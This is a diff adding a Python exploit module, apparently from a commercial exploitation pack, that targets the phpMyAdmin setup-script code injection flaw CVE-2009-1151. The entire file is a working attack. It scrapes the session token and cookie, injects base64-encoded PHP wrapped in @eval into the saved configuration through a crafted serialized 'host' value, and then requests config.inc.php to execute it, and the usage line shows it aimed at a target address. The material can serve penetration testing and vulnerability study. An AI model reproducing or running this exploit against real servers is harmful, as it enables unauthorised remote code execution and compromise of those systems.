@@ -1,0 +1,172 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2012
+#
+
+import sys, time, os, thread
+from re import findall
+from base64 import b64encode
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from MOSDEF import mosdef
+from libs.spkproxy import header, body
+from libs.canvasos import *
+import StringIO
+import urllib
+
+NAME = "d2sec_phpmyadmin_rce"
+VERSION = "0.1"
+DESCRIPTION = "Phpmyadmin config file code injection vulnerability"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [["Linux"]]
+
+DOCUMENTATION = {}
+DOCUMENTATION["Versions Affected"] = "2.11.x < 2.11.9.5 and 3.x < 3.1.3.1"
+DOCUMENTATION["Date public"] = "2009/03/26"
+DOCUMENTATION["CVE Name"] = "CVE-2009-1151"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-CVE-2009-1151"
+
+NOTES = """
+Usage:
+./3rdparty/D2SEC/d2sec_phpmyadmin_rce/d2sec_phpmyadmin_rce.py -t 172.16.244.141 -O uri:"/phpMyAdmin-3.0.1.1" -O phpcode:"phpinfo();"
+"""
+
+DOCUMENTATION["Notes"] = NOTES
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.TROJANMODE = 0
+    self.host = '' 
+    self.port = 80 
+    self.phpcode = ''
+    self.uri = '/phpMyAdmin-3.0.1.1'
+    self.name = NAME
+	
+  def getargs(self):
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port",self.port))
+    self.uri = self.argsDict.get("uri",self.uri)
+    self.phpcode = self.argsDict.get("phpcode", self.phpcode)
+
+  def grab_session(self, content, headers):
+    token = cookie = ''
+    r1 = findall('name="token" value="(\w{32})"', content)
+    token = r1[0].decode()
+    headers = headers.split('\n')
+    cookie = ''
+    for header in headers:
+      if 'Set-Cookie:' in header and 'phpMyAdmin' in header: 
+        cookie = header[len('Set-Cookie: '):]
+        return token, cookie
+
+  def make_payload(self):
+    payload = b64encode(self.phpcode).strip()
+    payload = payload.rstrip('=')
+    payload = '@eval(base64_decode(%s))'%payload
+    return payload
+
+  def run(self):
+    self.getargs()
+    self.setInfo('[D2] %s attacking %s:%d' % (NAME, self.host, self.port))
+    self.log('[D2] %s attacking %s:%d' % (NAME, self.host, self.port))
+    self.log('[D2] Execute \"%s\"' % self.phpcode)
+    content = headers = ''
+    s_content = StringIO.StringIO()
+    s_headers = StringIO.StringIO()
+    try:
+      import pycurl
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      self.log('[D2] Install module python-pycurl')
+      return 0
+    ###
+    request = ''
+    request += 'http://%s:%d' % (self.host, self.port)
+    request += self.uri
+    request += '/scripts/setup.php'
+    try:
+      c = pycurl.Curl()
+      c.setopt(pycurl.URL, '%s' % request)
+      c.setopt(pycurl.HEADER, 1)
+      c.setopt(c.WRITEFUNCTION, s_content.write)
+      c.setopt(c.HEADERFUNCTION, s_headers.write)
+      c.setopt(c.TIMEOUT, 15)
+      c.setopt(c.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+      c.perform()
+      content = s_content.getvalue()
+      headers = s_headers.getvalue()
+      c.close()
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      return ''
+    ###
+    (token, cookie) = self.grab_session(content, headers)
+    payload = self.make_payload()
+    l = len(payload) + 13
+    config = "a:1:{s:7:\"Servers\";a:1:{i:0;a:6:{s:%d:\"" % l + \
+            "host']='';" + payload + ";//" \
+            '";s:9:"abcdefghi";s:9:"extension";' \
+            's:6:"mysqli";s:12:"connect_type"' \
+            ';s:3:"tcp";s:8:"compress";b:0;s:9:"auth_type";' \
+            's:6:"config";s:4:"user";s:4:"abcd";}}}'
+    postdata = {
+        'token': token,
+        'action': 'save',
+        'configuration': config,
+        'eoltype': 'unix',
+    }
+    try:
+      c = pycurl.Curl()
+      c.setopt(pycurl.URL, '%s' % request)
+      c.setopt(pycurl.POST, 1)
+      c.setopt(pycurl.POSTFIELDS, urllib.urlencode(postdata))
+      c.setopt(pycurl.COOKIE, cookie)
+      c.setopt(c.TIMEOUT, 15)
+      c.setopt(c.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+      c.perform()
+      c.close()
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      return ''
+    ###
+    request = ''
+    request += 'http://%s:%d' % (self.host, self.port)
+    request += self.uri
+    request += '/config/config.inc.php'
+    try:
+      c = pycurl.Curl()
+      c.setopt(pycurl.URL, '%s' % request)
+      c.setopt(c.TIMEOUT, 15)
+      c.setopt(c.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+      c.perform()
+      c.close()
+    except Exception, e:
+      self.log('[D2] %s' % e)
+      return ''
+    self.log('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+    self.setInfo('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+    return 1
+
+  def usage(self):
+    print "Usage: "+sys.argv[0]+" -t target [-p port:80] -O uri:<uri> -O phpcode:<command> " 
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME,VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
